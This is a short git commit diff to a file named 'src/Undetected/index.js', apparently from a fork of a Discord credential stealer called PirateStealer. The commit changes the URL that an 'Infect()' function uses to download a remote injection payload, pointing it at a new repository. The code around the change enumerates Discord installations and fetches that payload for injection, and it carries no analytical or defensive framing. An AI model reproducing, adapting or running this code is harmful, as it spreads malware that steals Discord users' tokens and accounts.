244e5da0ee8b0dec63fc35eb930888b6df87aba4
xVllad44v2 <xvlad44@gmail.com>
2021-11-02 17:11:52 +0200

    da

--- src/Undetected/index.js
+++ src/Undetected/index.js
@@ -44,7 +44,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/bytixo/PirateStealer/dev/src/Injection/injection-clean', (resp) => {
+    https.get('https://raw.githubusercontent.com/xVlad44/da/dev/src/Injection/injection-clean', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
